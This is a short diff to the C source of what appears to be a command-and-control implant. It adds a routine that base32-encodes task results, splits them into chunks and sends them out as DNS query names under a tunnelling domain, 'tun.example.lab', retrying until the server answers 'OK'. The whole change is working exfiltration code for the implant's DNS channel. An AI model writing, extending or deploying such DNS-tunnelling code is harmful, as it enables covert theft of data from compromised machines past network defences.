@@ -183,6 +183,7 @@ static int send_chank_and_wait(const char* qname) {
 
     for(int i = 0; i < 3; i++) {
         int response_len = send_dns_packet(buffer, dns_packet_len, response, sizeof(response));
+        printf("[DEBUG] %s\n", response);
         if(response_len > 0 && strstr((char*)response, "OK") != NULL) {
             return 0;
         }
@@ -306,10 +307,33 @@ static int dns_send_result(char* task_id, char* result) {
     char base32_result[2000]; //buffer for string base32
     int b32_len = encode_base32((const unsigned char*)result, strlen(result), base32_result, sizeof(base32_result));
    
-    if(b32_len > 0) {
-        printf("[+/DNS] Before base32: %s\n", result);
-        printf("[+/DNS] Base32 result: %s", base32_result);
-    } 
+    int chunk_size = 30;
+    int offset = 0;
+    int part_num = 1;
+    char qname[256] = {0};
+
+    while(offset < b32_len) {
+        int current_chunk_len = ((b32_len - offset) >= chunk_size) ? chunk_size : (b32_len - offset);
+
+        char chunk[64] = {0};
+        memcpy(chunk, &base32_result[offset], current_chunk_len);
+        chunk[current_chunk_len] = '\0';
+
+        if((offset + current_chunk_len) >= b32_len) {
+            snprintf(qname, sizeof(qname), "%s.end.%s.r.tun.example.lab", chunk, task_id);
+        } else {
+            snprintf(qname, sizeof(qname), "%s.%02d.%s.r.tun.example.lab", chunk, part_num, task_id);
+        }
+        
+        if(send_chank_and_wait(qname) == -1) {
+            printf("[-/DNS] Error sending chunk.\n");
+            return -1;    
+        }
+        
+        offset += current_chunk_len;
+        part_num++;
+    }
+
     return 0;
 }
 
